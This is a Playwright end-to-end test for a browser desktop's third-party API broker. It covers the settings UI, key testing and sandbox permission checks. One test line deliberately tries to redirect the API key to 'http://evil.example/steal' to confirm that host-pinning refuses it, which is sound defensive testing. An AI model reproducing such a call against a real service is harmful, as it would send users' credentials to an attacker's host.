// End-to-end: the generic third-party-API broker (gifos.api).
// - Settings → Third-party APIs renders configured rows; ＋ Add makes a new one;
//   the Test button hits the base URL with the key attached (Token auth).
// - A sandboxed app that declares capabilities.api:["deepgram"] can call
//   gifos.api("deepgram", …); the runtime attaches the key (app never sees it),
//   returns the parsed JSON, and REFUSES to send the key to any other host.
//
// Needs: static server on 8099, and test/fake-keyapi.js on 8792.
const { chromium } = require('/opt/node22/lib/node_modules/playwright');
const CHROME = '/opt/pw-browsers/chromium-1194/chrome-linux/chrome';
const BASE = process.env.BASE || 'http://127.0.0.1:8099';
const API = 'http://127.0.0.1:8792';
const PROXY = 'http://127.0.0.1:8793';

let failures = 0;
function check(name, cond, detail) { console.log((cond ? 'PASS' : 'FAIL') + ' — ' + name + (detail ? '  (' + detail + ')' : '')); if (!cond) failures++; }
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// Pre-seed two API profiles the way the Settings UI would store them: one
// direct, one routed through the CORS proxy (as Deepgram would need).
const API_CFG = JSON.stringify({
  deepgram: { url: API, authType: 'token', key: 'dg-secret-key' },
  deepgramp: { url: API, authType: 'token', key: 'dg-secret-key', proxy: PROXY },
});

(async () => {
  const browser = await chromium.launch({ executablePath: CHROME });
  const context = await browser.newContext();
  await context.addInitScript((cfg) => { try { window.localStorage.setItem('gifos_api_config', cfg); } catch (e) {} }, API_CFG);
  const page = await context.newPage();
  page.on('console', (m) => { if (m.type() === 'error') console.log('  [page]', m.text()); });
  page.on('pageerror', (e) => console.log('  [pageerror]', e.message));

  await page.goto(BASE + '/index.html');
  await page.waitForSelector('.icon', { timeout: 10000 });
  await sleep(400);

  // ---- Settings → Third-party APIs ----
  await page.locator('#sys-menu-btn').click();
  await page.locator('.ctx button', { hasText: 'Settings' }).click();
  await page.waitForSelector('.api-row', { state: 'attached', timeout: 5000 });
  check('Settings shows a row for every pre-seeded third-party API', (await page.locator('.api-row').count()) === 2);
  await page.locator('summary', { hasText: 'Third-party APIs' }).click();
  await page.waitForSelector('.api-test', { state: 'visible', timeout: 5000 });
  // Test the seeded "deepgram" row — key attached → reachable.
  await page.locator('.api-test').first().click();
  await page.waitForFunction(() => {
    const s = document.querySelector('.api-status');
    return s && /reachable|rejected|reach|returned/.test(s.textContent);
  }, null, { timeout: 8000 });
  const st = await page.locator('.api-status').first().textContent();
  check('the API Test button reports the host reachable with the key', /reachable/.test(st), st);
  // Wrong key → rejected.
  await page.locator('.api-f[data-f="key"]').first().fill('nope');
  await page.locator('.api-test').first().click();
  await page.waitForFunction(() => /rejected/.test((document.querySelector('.api-status') || {}).textContent || ''), null, { timeout: 8000 });
  check('Test flags a rejected key', /rejected/.test(await page.locator('.api-status').first().textContent()));
  // ＋ Add makes a fresh, empty row.
  await page.locator('#api-add').click();
  check('＋ Add creates another API row', (await page.locator('.api-row').count()) === 3);
  // The proxy toggle reveals a custom-proxy URL field.
  await page.locator('.api-proxy-ck').last().check();
  check('ticking the CORS-proxy box reveals the custom-proxy URL field', await page.locator('.api-proxy-url').last().isVisible());
  // Restore the good key before closing so nothing is saved wrong (we close
  // without saving anyway; the app reads localStorage which is untouched).
  await page.locator('#set-close').click();

  // ---- a capability app that calls gifos.api ----
  await page.evaluate(async () => {
    const html = '<!doctype html><meta charset="utf-8"><div id="ok">…</div><div id="deny">…</div><div id="host">…</div><div id="proxy">…</div>' +
      '<script>(async function(){' +
      // 1) declared API round-trips: parsed JSON back, key never visible here.
      '  try { var r = await gifos.api("deepgram", { method:"POST", path:"/v1/listen", query:{ model:"nova-3" }, body:{ audio:"x" }, as:"json" });' +
      '        var w = r && r.json && r.json.results.channels[0].alternatives[0].words;' +
      '        document.getElementById("ok").textContent = "ok:" + r.status + ":" + (w?w.length:-1) + ":" + (w&&w[0].filler?"filler":"nofiller"); }' +
      '  catch(e){ document.getElementById("ok").textContent = "ERR:"+e.message; }' +
      // 2) an UNDECLARED name is refused by the runtime.
      '  try { await gifos.api("schwab", { path:"/x" }); document.getElementById("deny").textContent = "deny:LEAKED"; }' +
      '  catch(e){ document.getElementById("deny").textContent = "deny:" + (/did not declare/.test(e.message)?"blocked":e.message); }' +
      // 3) host-pinning: an absolute off-host path is refused (key can't be redirected).
      '  try { await gifos.api("deepgram", { path:"http://evil.example/steal" }); document.getElementById("host").textContent = "host:LEAKED"; }' +
      '  catch(e){ document.getElementById("host").textContent = "host:" + (/relative path|stay on the configured host/.test(e.message)?"pinned":e.message); }' +
      // 4) the same call routed through the CORS proxy still round-trips (key attached, forwarded).
      '  try { var p = await gifos.api("deepgramp", { method:"POST", path:"/v1/listen", body:{ audio:"x" }, as:"json" });' +
      '        var pw = p && p.json && p.json.results.channels[0].alternatives[0].words;' +
      '        document.getElementById("proxy").textContent = "proxy:" + p.status + ":" + (pw?pw.length:-1); }' +
      '  catch(e){ document.getElementById("proxy").textContent = "proxy:ERR:"+e.message; }' +
      '})();<\/script>';
    const bytes = await GifOS.gif.encode({
      'manifest.json': JSON.stringify({ gifos: '1.0', appId: 'apitest', name: 'ApiTest', entry: 'index.html', capabilities: { db: true, api: ['deepgram', 'deepgramp'] } }),
      'index.html': html,
    });
    const fid = GifOS.store.uid('file');
    await GifOS.store.putFile({ id: fid, name: 'ApiTest.gif', bytes, kind: 'gif', isApp: true, appId: 'apitest', mime: 'image/gif' });
    await GifOS.store.putItem({ id: GifOS.store.uid('item'), kind: 'file', fileId: fid, name: 'ApiTest.gif', parent: null, x: 620, y: 320, iconSize: 64 });
    await GifOS.desktop.load(); await GifOS.desktop.render();
  });
  const [app] = await Promise.all([
    context.waitForEvent('page'),
    page.locator('.icon', { hasText: 'ApiTest.gif' }).dblclick(),
  ]);
  app.on('pageerror', (e) => console.log('  [app pageerror]', e.message));
  await app.waitForSelector('iframe', { timeout: 8000 });
  const fr = app.frameLocator('iframe');

  await fr.locator('#ok').filter({ hasText: /ok:|ERR:/ }).waitFor({ timeout: 10000 });
  const ok = await fr.locator('#ok').textContent();
  check('gifos.api() round-trips through the runtime with the key attached', /^ok:200:3:filler$/.test(ok), ok);

  await fr.locator('#deny').filter({ hasText: /deny:/ }).waitFor({ timeout: 8000 });
  const deny = await fr.locator('#deny').textContent();
  check('an undeclared API name is refused (manifest gate)', /deny:blocked/.test(deny), deny);

  await fr.locator('#host').filter({ hasText: /host:/ }).waitFor({ timeout: 8000 });
  const host = await fr.locator('#host').textContent();
  check('the key is host-pinned — an off-host path is refused', /host:pinned/.test(host), host);

  await fr.locator('#proxy').filter({ hasText: /proxy:/ }).waitFor({ timeout: 8000 });
  const proxy = await fr.locator('#proxy').textContent();
  check('a proxied API call round-trips through the CORS proxy (key attached, forwarded)', /^proxy:200:3$/.test(proxy), proxy);

  await app.close();
  await browser.close();
  console.log(failures ? ('\n' + failures + ' FAILURE(S)') : '\nALL PASS');
  process.exit(failures ? 1 : 0);
})().catch((e) => { console.error(e); process.exit(1); });
